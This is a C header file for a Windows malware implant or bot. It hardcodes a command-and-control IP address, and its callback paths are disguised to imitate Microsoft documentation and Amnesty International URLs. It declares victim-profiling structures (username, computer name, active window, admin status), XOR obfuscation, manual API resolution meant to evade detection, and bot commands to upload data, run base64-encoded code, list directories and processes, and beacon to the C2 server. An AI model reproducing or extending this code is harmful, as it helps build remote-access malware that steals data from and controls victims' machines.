#pragma once

#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <Wininet.h>
//#include <stdio.h>
#include <tlhelp32.h>
#include <wtsapi32.h>
#include <stdarg.h>

#define SYNCER "Global\\CMIACIN"
#define _C2_CALLBACK_ADDRESS L"95.179.225.165"//L"136.244.116.216"
#define _CALLBACK_URL L"/docs.microsoft.com"
#define _REGISTER_URL L"/amnesty.org"
#define _POST_HEADER L"Content-Type: application/x-www-form-urlencoded\r\n"
#define _HEADER_LEN -1
#define MODE_CHECKIN_DATA 0x1000
#define MODE_CHECKIN_NO_DATA 0x2000
#define DO_REGISTER 0x6000
#define DO_CALLBACK 0x4000

//ntdll.dll
typedef struct _UNICODE_STRING 
{
	USHORT  Length;
	USHORT  MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

#include "ntddk.h"
#include "StaticData.h"
#include "Api.h"
#include "base64.h"

typedef struct OsVer{
	DWORD dwMajor;
	DWORD dwMinor;
	DWORD dwBuild;
	BOOL isX64;
}OsVerStruct;

typedef struct BotInfo{
	OsVerStruct osVer;
	char userName[MAX_PATH * sizeof(char)];
	char compName[MAX_PATH * sizeof(char)];
	char activeWindow[MAX_PATH * sizeof(wchar_t)];
	char isAdmin[10 * sizeof(char)];
}BotInfoStruct;

// USED BY RESOLVEMODULEBASE
typedef struct UNKSTRUCT_s
{
	DWORD NextStruct;	// 0x00
	DWORD Unk_0;		// 0x04
	DWORD Unk_1;		// 0x08
	DWORD Unk_2;		// 0x0C
	DWORD Base;			// 0x10
	DWORD Unk_3;		// 0x14
	DWORD Unk_4;		// 0x18
	DWORD Unk_5;		// 0x1C
	DWORD DllPath;		// 0x20
	DWORD Unk_7;		// 0x24
	DWORD Name;			// 0x28
} UNKSTRUCT_t;

char* systemFunction();
char* listDirectory(char* Dir);
char* getps();

//crt function
void XOR(char* data, size_t data_len);
void mysprintf(char* buf, const char* fmt, ...);
char * mystrdup (const char *s);
char* mystrchr (register const char *s, int c);
size_t mystrlen(const char* str);
char* strCpyA(char* dest, const char* src);
void memoryset(void* dest, int val, size_t len);
int mystrcmp(const char *s1, const char* s2);
void mymemcpy(void* dest, const void* src, unsigned int n);
void* hAlloc(size_t size);
void hFree(void* mem);

//bot command
BOOL fUpload(char* Buffer);
//BOOL ExecuteDLL(char* Base64Buffer);
LPVOID ReportExecutionFail();
BOOL ExecuteCode(char* Base64Buffer, BOOL CodeType);
BOOL Stdlib(char* Buffer);
char* BeaconCallbackC2(LPCWSTR CallbackAddress, BOOL isSSL, LPCWSTR targetPath, DWORD SendOpCode, LPCSTR SendBuffer, DWORD SendBufferSize);
void* get_proc_address(HMODULE module, const char* proc_name);
HMODULE resolveModuleBase(LPCSTR module);
HMODULE GetKernel32();